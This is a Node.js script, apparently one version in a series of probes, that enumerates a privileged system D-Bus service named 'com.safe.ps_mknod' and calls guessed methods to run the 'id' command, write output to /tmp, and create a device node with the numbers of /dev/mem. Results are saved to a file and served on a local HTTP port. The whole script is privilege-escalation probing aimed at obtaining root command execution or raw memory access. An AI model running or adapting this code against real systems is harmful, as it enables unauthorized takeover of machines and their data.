// v35 - introspect com.safe.ps_mknod full path + call Execute/CallCommand/mknod
// Pull server: 8118
try {
  var cp = require('child_process');
  var http = require('http');
  var fs = require('fs');
  var res = {};
  var total = 0, done_count = 0;

  function finish(key, val) {
    res[key] = String(val).substring(0, 1000);
    done_count++;
    if (done_count >= total) flush();
  }

  function flush() {
    var body = Object.keys(res).map(function(k){ return '[' + k + ']: ' + res[k]; }).join('\n') + '\n=== LIVE ===\n';
    try { fs.writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe35.txt', body); } catch(e) {}
    var srv = http.createServer(function(req, resp) {
      resp.writeHead(200, {'Content-Type': 'text/plain'});
      resp.end(body);
    });
    srv.listen(8118, '127.0.0.1', function(){});
    srv.on('error', function(){});
    setInterval(function(){}, 60000);
  }

  var DEST = 'com.safe.ps_mknod';

  function introspect(path, key) {
    total++;
    var cmd = 'dbus-send --system --print-reply --dest=' + DEST + ' "' + path + '" org.freedesktop.DBus.Introspectable.Introspect 2>&1';
    cp.exec(cmd, {timeout: 8000}, function(err, out) {
      finish(key, out || String(err));
    });
  }

  function dbus_call(key, path, iface_method, args) {
    total++;
    var cmd = 'dbus-send --system --print-reply --dest=' + DEST + ' "' + path + '" ' + iface_method + (args ? ' ' + args : '') + ' 2>&1';
    cp.exec(cmd, {timeout: 10000}, function(err, out) {
      finish(key, out || String(err));
    });
  }

  // 1. Introspect path tree
  introspect('/', 'intr_root');
  introspect('/com', 'intr_com');
  introspect('/com/safe', 'intr_com_safe');
  introspect('/com/safe/ps_mknod', 'intr_full');

  // 2. Try calling methods on /com/safe/ps_mknod
  var PATH = '/com/safe/ps_mknod';
  var IFACE = 'com.safe.ps_mknod';
  dbus_call('call_Execute_id',      PATH, IFACE + '.Execute',      'string:"id"');
  dbus_call('call_Execute_wrt',     PATH, IFACE + '.Execute',      'string:"id>/tmp/ps35.txt"');
  dbus_call('call_CallCommand_id',  PATH, IFACE + '.CallCommand',  'string:"id"');
  dbus_call('call_CallCommand_wrt', PATH, IFACE + '.CallCommand',  'string:"id>/tmp/ps35.txt"');
  dbus_call('call_Toggle',          PATH, IFACE + '.Toggle',       '');
  dbus_call('call_mknod_devmem',    PATH, IFACE + '.mknod',        'string:"/tmp/mem35" uint32:33188 uint32:1 uint32:1');
  dbus_call('call_Mknod_devmem',    PATH, IFACE + '.Mknod',        'string:"/tmp/mem35" uint32:33188 uint32:1 uint32:1');
  dbus_call('call_CreateNode',      PATH, IFACE + '.CreateNode',   'string:"/tmp/mem35" uint32:33188 uint32:1 uint32:1');

  // 3. Introspect with org.freedesktop.DBus.Properties too
  dbus_call('props_GetAll', PATH, 'org.freedesktop.DBus.Properties.GetAll', 'string:""');

} catch(e) {
  try { require('fs').writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe35-crash.txt', String(e.stack||e.message).substring(0,500)); } catch(e2){}
}
